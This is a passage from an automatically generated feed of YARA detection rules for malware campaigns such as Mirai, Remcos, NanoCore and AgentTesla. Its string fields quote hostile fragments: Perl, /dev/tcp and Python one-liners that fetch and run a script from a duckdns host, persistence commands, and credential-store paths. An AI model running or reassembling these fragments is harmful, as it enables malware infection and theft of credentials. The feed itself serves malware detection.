        hash = "167c44b17a6f796970a2a18ff391ea9d8ed4a0cc6820e22615b11716da5704be"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bb842806.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "(pd)->header.sysinfo == THREAD_GETMEM (THREAD_SELF, header.sysinfo)" ascii
        $s11 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3558208 and 12 of them
}

rule Sightlines_tlsh_86b466de_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-86b466de"
        date = "2026-10-24"
        campaign = "tlsh-86b466de"
        family = "mirai"
        hash = "a4e00dc0d18a48b71be811a3bd0493f59033a9621815a1a9444ba22c211f7a21"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-86b466de.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3604336 and 12 of them
}

rule Sightlines_tlsh_192d571d_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-192d571d"
        date = "2026-10-24"
        campaign = "tlsh-192d571d"
        family = "mirai"
        hash = "91015a7c0e203d60cee50a6775c2b8f59c1c49dc2d95390767f1d278bb6a9eca"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-192d571d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3549560 and 12 of them
}

rule Sightlines_tlsh_8eaa92e7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8eaa92e7"
        date = "2026-10-24"
        campaign = "tlsh-8eaa92e7"
        family = "mirai"
        hash = "7be3b84bbf630d9f58234f8afd8f0edbb7138a0e165f2e3e0a053fa08bbfb2d5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8eaa92e7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 3163456 and 12 of them
}

rule Sightlines_tlsh_97e852b8_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-97e852b8"
        date = "2026-10-24"
        campaign = "tlsh-97e852b8"
        family = "mirai"
        hash = "226bd33caa93d3ed07e70f229d58188caa10caa369cf9d1fbcc3af2842b3c5b5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-97e852b8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1978016 and 12 of them
}

rule Sightlines_tlsh_ef0607d7_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ef0607d7"
        date = "2026-10-23"
        campaign = "tlsh-ef0607d7"
        family = "remcos"
        hash = "11862191bdcfc8bb03d5e7e1f72a1db133eaaca9344916a6c79c3517f7aba06d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ef0607d7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED." ascii
        $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ascii
        $s2 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" wide
        $s3 = "Set fso = CreateObject(\"Scripting.FileSystemObject\")" wide
        $s4 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(Wscript.ScriptFullName)" wide
        $s5 = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\\" wide
        $s6 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" ascii
        $s7 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" wide
        $s8 = "C6858E06B70404E9CD9E3ECB662395B4429C648139053FB521F828AF606B4D3DBAA14B5E77EFE75928FE1DC127A2FFA8DE33" ascii
        $s9 = "fso.DeleteFile(Wscript.ScriptFullName)" wide
        $s10 = "6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296" ascii
        $s11 = "11839296A789A3BC0045C8A5FB42C7D1BD998F54449579B446817AFBD17273E662C97EE72995EF42640C550B9013FAD07613" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1220688 and 12 of them
}

rule Sightlines_tlsh_a59464ec_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a59464ec"
        date = "2026-10-23"
        campaign = "tlsh-a59464ec"
        family = "mirai"
        hash = "10a76ea06517991202d6766a1d55e5aba67e81600f67ea55bcbf5363ac1f6d42"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a59464ec.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curl -s -o /dev/null --max-time 15 -w '%{speed_download} %{size_download}' 'https://speed.cloudflare" ascii
        $s1 = "PRIVMSG %s :KILLED bot=%s sig=%d killer_pid=%d killer_uid=%d comm=%s exe=%s" ascii
        $s2 = "[%s] speedtest: %.2f Mbps down (%.2f MB/s, %.1f MB sample) [curl]" ascii
        $s3 = "[%s] arch: pointer=%d-bit, endian=%s, caps: threads=%d discord_socks=%d" ascii
        $s4 = "[%s] start_flood: usage: <mode> <ip> <port> [args]" ascii
        $s5 = ".com/__down?bytes=10000000' 2>/dev/null" ascii
        $s6 = "command -v speedtest-cli >/dev/null 2>&1" ascii
        $s7 = "[%s] pps_onepacket size=%d socks=%d %ds" ascii
        $s8 = "[%s] killall t%d %s syns=%ld ok=%ld writes=%ld" ascii
        $s9 = "4 32 33 36 35 65 64 66 72 34 35 34 77 72 71 65 4E 65 24 ED 65 76 E8 E7 98 7E AE D9 8E 79 87 AE AE 8E" ascii
        $s10 = "/var/tmp/.systemd-resolved-helper" ascii
        $s11 = "4 34 32 33 36 35 65 64 66 72 34 35 34 77 72 71 65 4E 65 24 ED 65 76 E8 E7 98 7E AE D9 8E 79 87 AE AE" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fe862d8f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fe862d8f"
        date = "2026-10-23"
        campaign = "tlsh-fe862d8f"
        family = ""
        hash = "118385e79114cb138d99509523ec8288069f5a04479428ade0c5b2f95a080b99"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fe862d8f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1081536 and 12 of them
}

rule Sightlines_rich_header_hash_97f41c68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-97f41c68"
        date = "2026-10-23"
        campaign = "rich_header_hash-97f41c68"
        family = ""
        hash = "0119b473d624ace8d60fcb228621c4e934e57e971f714365588e1bf7a1318d18"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-97f41c68.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "((FreeBlock->Flags & HEAP_ENTRY_DECOMMITTED) || (ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_" ascii
        $s1 = "tifiers (RIDs) have been exhausted. Please see http://go.microsoft.com/fwlink/?LinkId=228610 for rec" wide
        $s2 = "CLIENT(ntdll): Found CheckAppHelp = %d for %wZ in ImageFileExecutionOptions" ascii
        $s3 = "*!(CheckedFlags & ~HEAP_CREATE_VALID_MASK)" ascii
        $s4 = "(This->PrivateDynamicallyAllocatedString == NULL) || (This->PrivateDynamicallyAllocatedString->Buffe" ascii
        $s5 = "A serial I/O operation completed because the time-out period expired. (The IOCTL_SERIAL_XOFF_COUNTER" wide
        $s6 = "ROUND_UP_TO_POWER2(FreeBlock, PAGE_SIZE) == (ULONG_PTR)FreeBlock" ascii
        $s7 = "his error if the display driver does not support the DXGKMDT_OPM_GET_ACP_AND_CGMSA_SIGNALING and DXG" wide
        $s8 = "An FWP_VALUE or FWPM_CONDITION_VALUE is of the wrong type." wide
        $s9 = "Init routine %p for DLL \"%wZ\" failed during DLL_PROCESS_ATTACH" ascii
        $s10 = "May not specify Lock parameter with HEAP_NO_SERIALIZE" ascii
        $s11 = "SXS: Assembly directory name stored in assembly information too long (%lu bytes) - ACTIVATION_CONTEX" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3389440 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_9baffd86_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-9baffd86"
        date = "2026-10-23"
        campaign = "dotnet_typelib_guid-9baffd86"
        family = ""
        hash = "1a28f81ebda0180593503eca2aa2cec0e7666fe5ed076eae39d0da1a560e0e83"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-9baffd86.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "`Gets or sets the SWN p value (probability of casual) for switching algorithm (Floyd 0--p--1 BFS)" ascii
        $s2 = "CThe third parameter of the distribution (shape c, xMin, xMax, k, v)" ascii
        $s3 = "]The probability of transmission per single sexual intercourse from Male to Male, (homosexual)" ascii
        $s4 = "2The fourth parameter of the distribution (xMax, w)" ascii
        $s5 = "7Is the group's population (graph vertices) initialised." ascii
        $s6 = "%System.Globalization.NumberFormatInfo!" ascii
        $s7 = "jThe second parameter of the distribution. (scale b, shape c, xMin, xMax, degree of freedom df, d, p" ascii
        $s8 = "_Gets or sets the maximum size for numerical calculation of the network efficiency (path length)" ascii
        $s9 = "]Gets or sets the number of initial infected individuals for Temporal and Conditional warm-up." ascii
        $s10 = "VGets or sets the probability of concurrent partnerships during the simulation warm-up." ascii
        $s11 = "2Gets or Sets the simulation warm-up configuration." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2353152 and 12 of them
}

rule Sightlines_tlsh_f02ec3b2_nanocore
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f02ec3b2"
        date = "2026-10-23"
        campaign = "tlsh-f02ec3b2"
        family = "nanocore"
        hash = "2d54bf055e8791b01f58eadb2926dd4ddad3646d6ebdd92073b6b29c5c8ec2de"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f02ec3b2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "#=qtlZnL8mho$rv1eTFz0Mw9UYFC_yCabEZ0xtVePn6wR5aSHE7ti3UfKg2l7D0_xk8" ascii
        $s1 = "#=qgbI51haY38WJ4NumXDqnLC_uKv$aRHAyD63c9HgGYzlsFjikAASqT8RCSswEMouz" ascii
        $s2 = "#=qF4e058OW__NtTzhWOs1UXEJiHrTSwnIZ3q2u9UaLbo49AZaoog8nMfoDeA9BGVvy" ascii
        $s3 = "#=qVCHxDTr$$bwFMb6i9vBKRZciaa69edA3gsLNOty0RAzCorWRBUh2v0PgySYBEvZ0" ascii
        $s4 = "#=qCGokdf0OOxeMJLDkXSfc3NPmwygIQ29RjKQWj$wbNGB9C1pPgma_891QiNyTRXcA" ascii
        $s5 = "#=qK4wGebauvtmTKO0oAyLFzHLhr9rU3HNJmU_ur7Zop$YvLzV4HzmIQ45YslW_q1Vc" ascii
        $s6 = "#=qXjNBjXFhVcOvrRAG8alfq96_gJ4jOa0wwNOaztY3QjLWnMT6wXGDzBnHuUkef5N0" ascii
        $s7 = "#=qyEH54IW$f9fUJb7FOR8r3vj6e$onLGrpm2VGycjbl9TZJEqkwtA4y4bL9ExOWpiA" ascii
        $s8 = "#=q3TG8MLoZf1Y44PREVW$6m76IGmuYE_BOhC_OTjkQJFtYWwRtSeFqevP9hiteuLfz" ascii
        $s9 = "#=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX" ascii
        $s10 = "#=q6Aboe3ONIkez7GgqcdWPi0_vrT_i53_89HUeagGM6MThXvFkvl8hpSeHO1UJawKN" ascii
        $s11 = "#=qenWi8guqQrvoGB55djo0ka_844yTmViBn5_Fr2X6HAceO7AJErk_Rh7nfkfqtUbq" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_01d19110_prometei
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-01d19110"
        date = "2026-10-22"
        campaign = "tlsh-01d19110"
        family = "prometei"
        hash = "0a16883a25d4d859ad2907f68981cd4c480d9bb27c2511de90e3d372162e5729"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-01d19110.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 4.24 Copyright (C) 1996-2024 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = " rrrr!\"#$rrrr%&'(rrrr)*+,rrrr-./0rrrr1234rrrr5678rrrr9:;<rrrr=>?@rrrrABCDrrrrEFGHrrrrIJKLrrrrMNOQrrr" ascii
        $s3 = " NNNN!#$`NNNNabcdNNNNefghNNNNijklNNNNmnopNNNNqrstNNNNuvwxNNNNyz{|NNNN}~" ascii
        $s4 = " \"$9999%&/59999679:9999<DGH9999I_`a9999bc" ascii
        $s5 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s6 = "rRSTUrrrrVWXYrrrrZ[\\^rrrr_jkrrrrrstu" ascii
        $s7 = "ZabctZhijklmnopqrstuvwx" ascii
        $s8 = "GCC: (Ubuntu 9.3.0-17u" ascii
        $s9 = "o+c6wpXySE3l2z37X3Z" ascii
        $s10 = "hr9f244U7KMUIM5f?]" ascii
        $s11 = "hTbyxwz-bOtEuMN2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_signer_cert_sha1_10b07153_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-10b07153"
        date = "2026-10-23"
        campaign = "signer_cert_sha1-10b07153"
        family = "connectwise"
        hash = "0b4ba2281e8aa8ce0047daf499459487db790a72fa2230d4d1291cddf5483807"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-10b07153.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Connectwise, LLC0" ascii
        $s1 = "Connectwise, LLC1" ascii
        $s2 = "250815235959Z0e1" ascii
        $s3 = "351125235959Z0B1" ascii
        $s4 = "220817000000Z" ascii
        $s5 = "240926000000Z" ascii
        $s6 = "Florida1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 14283872 and 7 of them
}

rule Sightlines_tlsh_0de6deff_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-0de6deff"
        date = "2026-10-23"
        campaign = "tlsh-0de6deff"
        family = ""
        hash = "078b8c31bbe260e7ed6c7164033a03d1efd59bbab53e9326e56660dd47e3abe9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-0de6deff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "d,Q:0x9b},B=a0I;return/headless|bytespider/i[B(a0c.d)](a0p[B(a0c.Q)]);},'appVersionCheck':function()" ascii
        $s1 = "{d:0xc6},t=a0I;return t(a0a.d)in window||!!a0p[t(0xc6)];},'userAgentCheck':function(){var a0c={d:0x9" ascii
        $s2 = "{var a0e={d:0x9d},T=a0I;return/headless/i[T(a0e.d)](a0p['appVersion']);},'pluginArraySpoofing':funct" ascii
        $s3 = "ion(){var a0S={d:0x96,Q:0xb0,m:0xb0,v:0xb7},k=a0I;let d=PluginArray[k(a0S.d)]===a0p[k(a0S.Q)]['__pro" ascii
        $s4 = "Int(U(a0y.o))/0xc)+parseInt(U(0x93))/0xd;if(v===Q)break;else m['push'](m['shift']());}catch(p){m['pu" ascii
        $s5 = "proto__'];return!d;},'noLanguage':function(){var a0g={d:0x98},J=a0I;return!a0p[J(0x92)]||a0p[J(0xa1)" ascii
        $s6 = "sh'](m['shift']());}}}(a0m,0xb1385));function a0v(d,Q){var m=a0m();return a0v=function(v,p){v=v-0x92" ascii
        $s7 = "outerWidth']===0x0;}},a0w=function(m,v){var a0z={d:0xbe,Q:0xab,m:0xb6},C=a0I,p=(function(){var w=!![" ascii
        $s8 = "mimeTypeArraySpoofing':function(){var a0n={d:0xa2},Y=a0I;let d=MimeTypeArray['prototype']===a0p[Y(a0" ascii
        $s9 = "=d();while(!![]){try{var v=parseInt(U(0xc5))/0x1*(-parseInt(U(0xbc))/0x2)+parseInt(U(a0y.d))/0x3*(-p" ascii
        $s10 = "][J(a0g.d)]===0x0;},'zeroOuterDimensions':function(){return window['outerHeigh'+'t']===0x0&&window['" ascii
        $s11 = ";var r=m[v];return r;},a0v(d,Q);}var a0p=window[a0I(0xc8)],a0r={'webdriverCheck':function(){var a0a=" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_a6e844e1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a6e844e1"
        date = "2026-10-23"
        campaign = "imphash-a6e844e1"
        family = ""
        hash = "5dee24569905b01acb7bff4a3e1e4b334ddaf295a6db6faf44b2afaa3d7540e3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a6e844e1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s3 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s4 = "VTEnumerator<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>L\"D" ascii
        $s5 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s6 = "Embarcadero Delphi for Win32 compiler version 33.0 (26.0.36039.7899)" ascii
        $s7 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s8 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s10 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s11 = ";TDictionary<System.string,System.Cardinal>.TValueEnumeratorPvH" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 17361024 and 12 of them
}

rule Sightlines_tlsh_036dcb31_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-036dcb31"
        date = "2026-10-23"
        campaign = "tlsh-036dcb31"
        family = "agenttesla"
        hash = "1308da2a18c17d5d7e4e3efa95316f53e2fb981ad9e46cda66c26b18b1faef90"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-036dcb31.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676" wide
        $s1 = "HKEY_CURRENT_USER\\Software\\Aerofox\\Foxmail\\V3.1" wide
        $s2 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s3 = "HKEY_CURRENT_USER\\Software\\Aerofox\\FoxmailPreview" wide
        $s4 = "\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt" wide
        $s5 = "\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt" wide
        $s6 = "HKEY_CURRENT_USER\\Software\\RimArts\\B2\\Settings" wide
        $s7 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s8 = "SmartFTP\\Client 2.0\\Favorites\\Quick Connect" wide
        $s9 = "Software\\A.V.M.\\Paltalk NG\\common_settings\\core\\users\\creds\\" wide
